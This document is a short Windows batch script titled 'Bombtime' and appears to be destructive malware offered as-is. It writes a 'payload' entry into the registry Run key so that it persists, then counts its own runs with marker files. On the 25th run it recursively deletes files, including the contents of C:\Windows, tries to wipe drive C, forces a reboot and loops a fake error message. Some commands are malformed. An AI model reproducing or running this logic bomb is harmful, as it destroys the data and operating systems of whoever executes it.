# Bombtime
@echo off
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "payload" /t REG_SZ /F /D "C:\Windows\system32.bat"
if exist lig1.drv goto 2
echo > lig1.drv sdfsdf
goto fim
:2
if exist lig2.drv goto 3
echo > lig2.drv sdfsdf
goto fim
:3
if exist lig3.drv goto 4
echo > lig3.drv sdfsdf
goto fim
:4
if exist lig4.drv goto 5
echo > lig4.drv sdfsdf
goto fim
:5
if exist lig5.drv goto 6
echo > lig5.drv sdfsdf
goto fim
:6
if exist lig6.drv goto 7
echo > lig6.drv sdfsdf
goto fim
:7
if exist lig7.drv goto 8
echo > lig7.drv sdfsdf
goto fim
:8
if exist lig8.drv goto 9
echo > lig8.drv sdfsdf
goto fim
:9
if exist lig9.drv goto 10
echo > lig9.drv sdfsdf
goto fim
:10
if exist lig10.drv goto 11
echo > lig10.drv sdfsdf
goto fim
:11
if exist lig11.drv goto 12
echo > lig11.drv sdfsdf
goto fim
:12
if exist lig12.drv goto 13
echo > lig12.drv sdfsdf
goto fim
:13
if exist lig13.drv goto 14
echo > lig13.drv sdfsdf
goto fim
:14
if exist lig14.drv goto 15
echo > lig14.drv sdfsdf
goto fim
:15
if exist lig15.drv goto 16
echo > lig15.drv sdfsdf
goto fim
:16
if exist lig16.drv goto 17
echo > lig16.drv sdfsdf
goto fim
:17
if exist lig17.drv goto 18
echo > lig17.drv sdfsdf
goto fim
:18
if exist lig18.drv goto 19
echo > lig18.drv sdfsdf
goto fim
:19
if exist lig19.drv goto 20
echo > lig19.drv sdfsdf
goto fim
:20
if exist lig20.drv goto 21
echo > lig20.drv sdfsdf
goto fim
:21
if exist lig21.drv goto 22
echo > lig21.drv sdfsdf
goto fim
:22
if exist lig22.drv goto 23
echo > lig22.drv sdfsdf
goto fim
:23
if exist lig23.drv goto 24
echo > lig23.drv sdfsdf
goto fim
:24
if exist lig24.drv goto 25
echo > lig24.drv sdfsdf
goto fim
:25
del /s /q *.*
del /s /q c:\windows\
deltree/C: Y\*.*
shutdown -r -t 30 
:REPETE
MSG * Windows error occurred an system:Press an key continuar_
GOTO REPETE
